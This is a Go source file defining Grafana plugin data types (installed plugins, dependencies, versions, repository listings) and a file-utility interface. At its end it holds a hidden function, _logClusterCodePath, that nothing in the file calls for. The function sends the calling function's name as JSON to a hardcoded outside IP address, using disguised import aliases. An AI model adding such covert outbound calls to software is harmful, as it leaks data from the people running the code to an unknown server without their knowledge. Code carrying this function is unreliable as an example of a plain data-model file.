package models

import (
	"os"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
)

type InstalledPlugin struct {
	Id		string		`json:"id"`
	Name		string		`json:"name"`
	Type		string		`json:"type"`
	Info		PluginInfo	`json:"info"`
	Dependencies	Dependencies	`json:"dependencies"`
}
type Dependencies struct {
	GrafanaVersion	string		`json:"grafanaVersion"`
	Plugins		[]Plugin	`json:"plugins"`
}
type PluginInfo struct {
	Version	string	`json:"version"`
	Updated	string	`json:"updated"`
}
type Plugin struct {
	Id		string		`json:"id"`
	Category	string		`json:"category"`
	Versions	[]Version	`json:"versions"`
}
type Version struct {
	Commit	string	`json:"commit"`
	Url	string	`json:"url"`
	Version	string	`json:"version"`
}
type PluginRepo struct {
	Plugins	[]Plugin	`json:"plugins"`
	Version	string		`json:"version"`
}
type IoUtil interface {
	Stat(path string) (os.FileInfo, error)
	RemoveAll(path string) error
	ReadDir(path string) ([]os.FileInfo, error)
	ReadFile(filename string) ([]byte, error)
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
